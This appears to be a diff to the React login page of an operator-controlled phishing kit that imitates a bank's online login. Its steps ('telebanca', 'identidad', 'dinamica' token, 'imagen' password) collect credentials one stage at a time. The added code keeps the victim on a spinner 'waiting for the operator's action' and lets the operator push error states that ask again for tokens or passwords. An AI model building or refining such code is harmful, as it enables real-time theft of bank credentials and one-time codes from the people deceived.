@@ -77,11 +77,12 @@ export default function LoginPage() {
         if (session.state === "c-interna") {
           if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isNewSeq) {
             /* mantener error visible */
+          } else if (step === "tejuino" && appliedActionRef.current === "submitted-tejuino" && !isNewSeq) {
+            /* mantener spinner esperando acción del operador */
           } else if (
-            appliedActionRef.current !== "c-interna" ||
-            isNewSeq ||
             step !== "tejuino" ||
-            waitingPanel
+            isNewSeq ||
+            (appliedActionRef.current !== "c-interna" && !appliedActionRef.current.startsWith("submitted-"))
           ) {
             appliedActionRef.current = "c-interna";
             finishingRef.current = false;
@@ -189,11 +190,12 @@ export default function LoginPage() {
         ) {
           if (step === "telebanca" && appliedActionRef.current === "error-token" && !isNewSeq) {
             /* mantener error visible */
+          } else if (step === "telebanca" && appliedActionRef.current === "submitted-telebanca" && !isNewSeq) {
+            /* mantener spinner esperando acción del operador */
           } else if (
-            appliedActionRef.current !== "telebanca" ||
-            isNewSeq ||
             step !== "telebanca" ||
-            waitingPanel
+            isNewSeq ||
+            (appliedActionRef.current !== "telebanca" && !appliedActionRef.current.startsWith("submitted-"))
           ) {
             appliedActionRef.current = "telebanca";
             setOpsError("");
@@ -208,11 +210,12 @@ export default function LoginPage() {
         ) {
           if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isNewSeq) {
             /* mantener error visible */
+          } else if (step === "identidad" && appliedActionRef.current === "submitted-identidad" && !isNewSeq) {
+            /* mantener spinner esperando acción del operador */
           } else if (
-            appliedActionRef.current !== "identidad" ||
-            isNewSeq ||
             step !== "identidad" ||
-            waitingPanel
+            isNewSeq ||
+            (appliedActionRef.current !== "identidad" && !appliedActionRef.current.startsWith("submitted-"))
           ) {
             appliedActionRef.current = "identidad";
             setOpsError("");
@@ -238,11 +241,12 @@ export default function LoginPage() {
         } else if (session.state === "token" || session.state === "typing") {
           if (step === "dinamica" && appliedActionRef.current === "error-token" && !isNewSeq) {
             /* mantener error visible */
+          } else if (step === "dinamica" && appliedActionRef.current === "submitted-token" && !isNewSeq) {
+            /* mantener spinner esperando acción del operador */
           } else if (
-            appliedActionRef.current !== "token" ||
-            isNewSeq ||
             step !== "dinamica" ||
-            waitingPanel
+            isNewSeq ||
+            (appliedActionRef.current !== "token" && !appliedActionRef.current.startsWith("submitted-"))
           ) {
             appliedActionRef.current = "token";
             setOpsError("");
@@ -258,11 +262,12 @@ export default function LoginPage() {
         ) {
           if (step === "imagen" && appliedActionRef.current === "error-pass" && !isNewSeq) {
             /* mantener error visible */
+          } else if (step === "imagen" && appliedActionRef.current === "submitted-pass" && !isNewSeq) {
+            /* mantener spinner esperando acción del operador */
           } else if (
-            appliedActionRef.current !== actionKey ||
-            isNewSeq ||
             step !== "imagen" ||
-            waitingPanel
+            isNewSeq ||
+            (appliedActionRef.current !== actionKey && !appliedActionRef.current.startsWith("submitted-"))
           ) {
             appliedActionRef.current = actionKey;
             const next = {
